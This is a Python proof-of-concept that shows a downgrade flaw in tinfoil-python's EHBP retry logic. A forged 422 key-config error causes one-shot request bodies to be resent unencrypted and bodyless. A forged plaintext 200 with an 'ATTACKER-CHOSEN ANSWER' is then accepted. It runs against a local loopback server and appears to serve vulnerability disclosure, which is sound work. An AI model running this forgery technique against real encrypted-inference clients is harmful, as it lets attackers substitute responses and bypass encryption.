"""PoC: tinfoil-python's EHBP key-rotation retry can downgrade an encrypted POST
to an unencrypted, bodyless POST whose plaintext response is trusted.

Path (tinfoil-python src/tinfoil/client.py, _EHBPReVerifyingTransport.handle_request):

  1. inner EHBPTransport encrypts the request body by iterating request.stream
     (ehbp/transport.py handle_request -> identity.encrypt_request_stream).
  2. The TLS peer answers 422 application/problem+json with the key-config URN
     (anyone on path can forge this; it is a plaintext response).
  3. tinfoil-python re-attests (here: stubbed, returns the same genuine key)
     and calls retry_inner.handle_request(request) with the SAME httpx.Request.
  4. If request.stream is a one-shot stream (httpx IteratorByteStream over a
     file-like object or a non-generator iterator), the second iteration yields
     nothing, so encrypt_request_stream() returns None and the EHBP transport
     takes the "bodyless" path: it sends the POST with NO body, NO
     Ehbp-Encapsulated-Key, and returns the peer's response UNAUTHENTICATED
     (ehbp/transport.py: `if encrypted is None: return self._inner.handle_request(_bodyless_passthrough(request))`).
  5. The peer's forged 200 body is returned to the application as the result
     of the sealed POST.

Run:  ../pyenv/bin/python -I poc_retry_bodyless.py
"""

from __future__ import annotations

import io
import json
import sys
import threading
import tempfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import httpx
from ehbp import EHBPTransport
from ehbp.identity import ServerIdentity

# The real class under test, from the installed tinfoil-python checkout.
from tinfoil.client import _EHBPReVerifyingTransport

# --- a loopback "peer" (gateway / TLS terminator). It never has the HPKE key. ---

LOG: list[dict] = []
KEYCONFIG_422 = json.dumps({"type": "urn:ietf:params:ehbp:error:key-config", "title": "stale key"}).encode()
FORGED_200 = json.dumps({"id": "forged", "object": "chat.completion", "choices": [
    {"index": 0, "message": {"role": "assistant", "content": "ATTACKER-CHOSEN ANSWER"}, "finish_reason": "stop"}]}).encode()


class Peer(BaseHTTPRequestHandler):
    def log_message(self, *a):  # quiet
        pass

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = b""
        if self.headers.get("Transfer-Encoding", "").lower() == "chunked":
            while True:
                line = self.rfile.readline().strip()
                size = int(line.split(b";")[0] or b"0", 16)
                if size == 0:
                    self.rfile.readline()
                    break
                body += self.rfile.read(size)
                self.rfile.readline()
        else:
            body = self.rfile.read(n)
        entry = {
            "n": len(LOG) + 1,
            "path": self.path,
            "has_ehbp_header": "Ehbp-Encapsulated-Key" in self.headers,
            "transfer_encoding": self.headers.get("Transfer-Encoding"),
            "content_length": self.headers.get("Content-Length"),
            "body_len": len(body),
            "authorization": self.headers.get("Authorization"),
        }
        LOG.append(entry)
        if entry["n"] == 1:
            # Forged key-configuration mismatch (plaintext, no nonce).
            self.send_response(422)
            self.send_header("Content-Type", "application/problem+json")
            self.send_header("Content-Length", str(len(KEYCONFIG_422)))
            self.end_headers()
            self.wfile.write(KEYCONFIG_422)
        else:
            # Forged success for the retried request. No Ehbp-Response-Nonce.
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(FORGED_200)))
            self.end_headers()
            self.wfile.write(FORGED_200)


def start_peer() -> str:
    srv = ThreadingHTTPServer(("127.0.0.1", 0), Peer)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return f"http://127.0.0.1:{srv.server_address[1]}"


# --- stand-in for SecureClient: re-attestation "succeeds" and yields the same genuine key ---

class StubSecureClient:
    def __init__(self, pub_hex: str):
        self.pub_hex = pub_hex
        self.reverifications = 0

    def _build_ehbp_sync_transport(self) -> httpx.BaseTransport:
        self.reverifications += 1
        return EHBPTransport.from_public_key_hex(self.pub_hex, inner=httpx.HTTPTransport())


def run(label: str, content, pub_hex: str, url: str) -> None:
    LOG.clear()
    secure = StubSecureClient(pub_hex)
    inner = secure._build_ehbp_sync_transport()
    transport = _EHBPReVerifyingTransport(secure, inner)
    client = httpx.Client(transport=transport, follow_redirects=False)
    try:
        resp = client.post(url + "/v1/chat/completions",
                           headers={"Authorization": "Bearer tinfoil-test-key", "Content-Type": "application/json"},
                           content=content)
        outcome = f"status={resp.status_code} body={resp.text!r}"
    except Exception as e:  # noqa: BLE001
        outcome = f"raised {type(e).__name__}: {e}"
    print(f"\n=== {label} ===")
    for e in LOG:
        print("  peer saw request", e)
    print("  client outcome:", outcome)
    print("  re-attestations:", secure.reverifications)
    if LOG and LOG[-1]["n"] == 2 and not LOG[-1]["has_ehbp_header"] and LOG[-1]["body_len"] == 0 \
            and "ATTACKER-CHOSEN" in outcome:
        print("  VULNERABLE: retry went out as an unencrypted bodyless POST and the forged plaintext 200 was accepted")
    elif LOG and LOG[-1]["n"] == 2 and LOG[-1]["has_ehbp_header"]:
        print("  OK: retry was re-encrypted; forged nonce-less 200 rejected" if "raised" in outcome else "  UNEXPECTED")
    else:
        print("  (see above)")


def main() -> None:
    # A genuine server key pair stands in for the attested enclave key; the
    # peer never holds the private half.
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
    from cryptography.hazmat.primitives import serialization
    k = X25519PrivateKey.generate()
    pub_hex = k.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw).hex()
    ServerIdentity.from_public_key_hex(pub_hex)  # sanity

    url = start_peer()
    payload = json.dumps({"model": "m", "messages": [{"role": "user", "content": "CONFIDENTIAL prompt"}]}).encode()

    # Control: bytes body (what the OpenAI SDK sends) -> replayable ByteStream.
    run("control: content=bytes (replayable)", payload, pub_hex, url)

    # Vulnerable shapes: one-shot streams.
    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.write(payload)
    tmp.close()
    run("content=open(file,'rb') (file-like, one-shot)", open(tmp.name, "rb"), pub_hex, url)
    run("content=iter([...]) (non-generator iterator, one-shot)", iter([payload[:20], payload[20:]]), pub_hex, url)
    run("content=io.BytesIO (seekable file-like; httpx read()s it once)", io.BytesIO(payload), pub_hex, url)


if __name__ == "__main__":
    main()
